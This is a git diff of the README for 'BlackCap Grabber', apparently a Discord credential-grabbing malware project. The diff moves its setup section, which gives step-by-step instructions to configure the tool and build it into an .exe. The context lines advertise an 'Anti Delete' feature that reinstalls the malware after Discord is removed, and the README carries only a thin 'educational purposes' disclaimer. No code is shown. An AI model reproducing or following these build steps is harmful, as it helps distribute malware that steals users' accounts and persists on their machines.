@@ -9,8 +9,6 @@
 
 
 
-
-
 <h1 align="center">
   BlackCap Grabber 🔰
   DISCORD.GG/BLACKCAP
@@ -36,6 +34,18 @@ BlackCap was made for educational purposes, therefor all consequences caused by 
 - [🎉・Setting up BlackCap](#setup)
 - [⚙・Config](#config)
 - [📝・Changelog](#changelog)
+
+
+## <a id="setup"></a> 📁 〢 Setting up BlackCap
+
+1. Install [Python](https://www.python.org/downloads/)
+2. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
+3. Edit the Configuration [index.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/index.py#L52)
+4. Double Click on [build.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/build.bat) to build
+5. You have your .exe file enjoy :)
+
+
+
 
 ## <a id="features"></a>🔰 〢 Features
 
@@ -76,16 +86,6 @@ BlackCap was made for educational purposes, therefor all consequences caused by 
 - Anti Delete system (re install after Discord uninstall / Discord Update)
 > + More!
 ```
-
-
-
-## <a id="setup"></a> 📁 〢 Setting up BlackCap
-
-1. Install [Python](https://www.python.org/downloads/)
-2. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
-3. Edit the Configuration [index.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/index.py#L52)
-4. Double Click on [build.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/build.bat) to build
-5. You have your .exe file enjoy :)
 
 
 
